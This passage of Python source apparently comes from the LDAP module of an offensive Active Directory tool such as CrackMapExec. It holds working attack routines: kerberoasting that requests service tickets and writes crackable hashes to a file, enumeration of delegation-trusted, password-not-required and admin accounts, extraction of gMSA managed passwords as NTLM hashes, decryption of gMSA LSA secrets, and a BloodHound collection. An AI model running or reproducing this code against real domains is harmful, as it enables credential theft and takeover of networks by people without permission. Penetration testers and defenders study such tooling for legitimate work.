                                delegation = "unconstrained"
                            elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                                delegation = "constrained"
                        elif str(attribute["type"]) == "memberOf":
                            memberOf = str(attribute["vals"][0])
                        elif str(attribute["type"]) == "pwdLastSet":
                            if str(attribute["vals"][0]) == "0":
                                pwdLastSet = "<never>"
                            else:
                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                        elif str(attribute["type"]) == "lastLogon":
                            if str(attribute["vals"][0]) == "0":
                                lastLogon = "<never>"
                            else:
                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                        elif str(attribute["type"]) == "servicePrincipalName":
                            for spn in attribute["vals"]:
                                SPNs.append(str(spn))

                    if mustCommit is True:
                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
                            self.logger.debug(f"Bypassing disabled account {sAMAccountName} ")
                        else:
                            for spn in SPNs:
                                answers.append(
                                    [
                                        spn,
                                        sAMAccountName,
                                        memberOf,
                                        pwdLastSet,
                                        lastLogon,
                                        delegation,
                                    ]
                                )
                except Exception as e:
                    cme_logger.error(f"Skipping item, cannot process due to error {str(e)}")
                    pass

            if len(answers) > 0:
                self.logger.display(f"Total of records returned {len(answers):d}")
                TGT = KerberosAttacks(self).getTGT_kerberoasting()
                dejavue = []
                for (
                    SPN,
                    sAMAccountName,
                    memberOf,
                    pwdLastSet,
                    lastLogon,
                    delegation,
                ) in answers:
                    if sAMAccountName not in dejavue:
                        downLevelLogonName = self.targetDomain + "\\" + sAMAccountName

                        try:
                            principalName = Principal()
                            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                            principalName.components = [downLevelLogonName]

                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                                principalName,
                                self.domain,
                                self.kdcHost,
                                TGT["KDC_REP"],
                                TGT["cipher"],
                                TGT["sessionKey"],
                            )
                            r = KerberosAttacks(self).outputTGS(
                                tgs,
                                oldSessionKey,
                                sessionKey,
                                sAMAccountName,
                                self.targetDomain + "/" + sAMAccountName,
                            )
                            self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
                            self.logger.highlight(f"{r}")
                            with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                hash_kerberoasting.write(r + "\n")
                            dejavue.append(sAMAccountName)
                        except Exception as e:
                            self.logger.debug("Exception:", exc_info=True)
                            cme_logger.error(f"Principal: {downLevelLogonName} - {e}")
                return True
            else:
                self.logger.highlight("No entries found!")
                return
        self.logger.fail("Error with the LDAP account used")

    def trusted_for_delegation(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)

        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif str(attribute["type"]) == "userAccountControl":
                        userAccountControl = "0x%x" % int(attribute["vals"][0])
                    elif str(attribute["type"]) == "memberOf":
                        memberOf = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        if str(attribute["vals"][0]) == "0":
                            pwdLastSet = "<never>"
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif str(attribute["type"]) == "lastLogon":
                        if str(attribute["vals"][0]) == "0":
                            lastLogon = "<never>"
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e}")
                pass
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")
        return

    def password_not_required(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"
        try:
            self.logger.debug(f"Search Filter={searchFilter}")
            resp = self.ldapConnection.search(
                searchFilter=searchFilter,
                attributes=[
                    "sAMAccountName",
                    "pwdLastSet",
                    "MemberOf",
                    "userAccountControl",
                    "lastLogon",
                ],
                sizeLimit=0,
            )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                self.logger.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                return False
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            status = "enabled"
            lastLogon = "N/A"
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif str(attribute["type"]) == "userAccountControl":
                        if int(attribute["vals"][0]) & 2:
                            status = "disabled"
                        userAccountControl = f"0x{int(attribute['vals'][0]):x}"
                    elif str(attribute["type"]) == "memberOf":
                        memberOf = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        if str(attribute["vals"][0]) == "0":
                            pwdLastSet = "<never>"
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif str(attribute["type"]) == "lastLogon":
                        if str(attribute["vals"][0]) == "0":
                            lastLogon = "<never>"
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                            status,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {str(e)}")
                pass
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(f"User: {value[0]} Status: {value[5]}")
        else:
            self.logger.fail("No entries found!")
        return

    def admin_count(self):
        # Building the search filter
        searchFilter = "(adminCount=1)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif str(attribute["type"]) == "userAccountControl":
                        userAccountControl = "0x%x" % int(attribute["vals"][0])
                    elif str(attribute["type"]) == "memberOf":
                        memberOf = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        if str(attribute["vals"][0]) == "0":
                            pwdLastSet = "<never>"
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif str(attribute["type"]) == "lastLogon":
                        if str(attribute["vals"][0]) == "0":
                            lastLogon = "<never>"
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {str(e)}")
                pass
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")
        return

    def gmsa(self):
        self.logger.display("Getting GMSA Passwords")
        search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
        gmsa_accounts = self.ldapConnection.search(
            searchFilter=search_filter,
            attributes=[
                "sAMAccountName",
                "msDS-ManagedPassword",
                "msDS-GroupMSAMembership",
            ],
            sizeLimit=0,
            searchBase=self.baseDN,
        )
        if gmsa_accounts:
            answers = []
            self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

            for item in gmsa_accounts:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName = ""
                passwd = ""
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                    if str(attribute["type"]) == "msDS-ManagedPassword":
                        data = attribute["vals"][0].asOctets()
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        currentPassword = blob["CurrentPassword"][:-2]
                        ntlm_hash = MD4.new()
                        ntlm_hash.update(currentPassword)
                        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {sAMAccountName:<20} NTLM: {passwd}")
        return True

    def decipher_gmsa_name(self, domain_name=None, account_name=None):
        # https://aadinternals.com/post/gmsa/
        gmsa_account_name = (domain_name + account_name).upper()
        self.logger.debug(f"GMSA name for {gmsa_account_name}")
        bin_account_name = gmsa_account_name.encode("utf-16le")
        bin_hash = hmac.new(bytes("", "latin-1"), msg=bin_account_name, digestmod=hashlib.sha256).digest()
        hex_letters = "0123456789abcdef"
        str_hash = ""
        for b in bin_hash:
            str_hash += hex_letters[b & 0x0F]
            str_hash += hex_letters[b >> 0x04]
        self.logger.debug(f"Hash2: {str_hash}")
        return str_hash

    def gmsa_convert_id(self):
        if self.args.gmsa_convert_id:
            if len(self.args.gmsa_convert_id) != 64:
                self.logger.fail("Length of the gmsa id not correct :'(")
            else:
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldapConnection.search(
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                    searchBase=self.baseDN,
                )
                if gmsa_accounts:
                    answers = []
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == self.args.gmsa_convert_id:
                                    self.logger.highlight(f"Account: {sAMAccountName:<20} ID: {self.args.gmsa_convert_id}")
                                    break
        else:
            self.logger.fail("No string provided :'(")

    def gmsa_decrypt_lsa(self):
        if self.args.gmsa_decrypt_lsa:
            if "_SC_GMSA_{84A78B8C" in self.args.gmsa_decrypt_lsa:
                gmsa = self.args.gmsa_decrypt_lsa.split("_")[4].split(":")
                gmsa_id = gmsa[0]
                gmsa_pass = gmsa[1]
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldapConnection.search(
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                    searchBase=self.baseDN,
                )
                if gmsa_accounts:
                    answers = []
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == gmsa_id:
                                    gmsa_id = sAMAccountName
                                    break
                # convert to ntlm
                data = bytes.fromhex(gmsa_pass)
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob["CurrentPassword"][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {gmsa_id:<20} NTLM: {passwd}")
        else:
            self.logger.fail("No string provided :'(")

    def bloodhound(self):
        auth = ADAuthentication(
            username=self.username,
            password=self.password,
            domain=self.domain,
            lm_hash=self.nthash,
            nt_hash=self.nthash,
            aeskey=self.aesKey,
            kdc=self.kdcHost,
            auth_method="auto",
        )
        ad = AD(
            auth=auth,
            domain=self.domain,
            nameserver=self.args.nameserver,
            dns_tcp=False,
            dns_timeout=3,
        )
        collect = resolve_collection_methods("Default" if not self.args.collection else self.args.collection)
        if not collect:
            return
        self.logger.highlight("Resolved collection methods: " + ", ".join(list(collect)))

        self.logger.debug("Using DNS to retrieve domain information")
        ad.dns_resolve(domain=self.domain)

        if self.args.kerberos:
            self.logger.highlight("Using kerberos auth without ccache, getting TGT")
            auth.get_tgt()
        if self.args.use_kcache:
            self.logger.highlight("Using kerberos auth from ccache")

        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
        bloodhound = BloodHound(ad, self.hostname, self.host, self.args.port)
        bloodhound.connect()

        bloodhound.run(
            collect=collect,
            num_workers=10,
            disable_pooling=False,
            timestamp=timestamp,
            computerfile=None,
            cachefile=None,
            exclude_dcs=False,
        )

        self.logger.highlight(f"Compressing output into {self.output_filename}bloodhound.zip")
        list_of_files = os.listdir(os.getcwd())
        with ZipFile(self.output_filename + "bloodhound.zip", "w") as z:
            for each_file in list_of_files:
                if each_file.startswith(timestamp) and each_file.endswith("json"):
                    z.write(each_file)
                    os.remove(each_file)
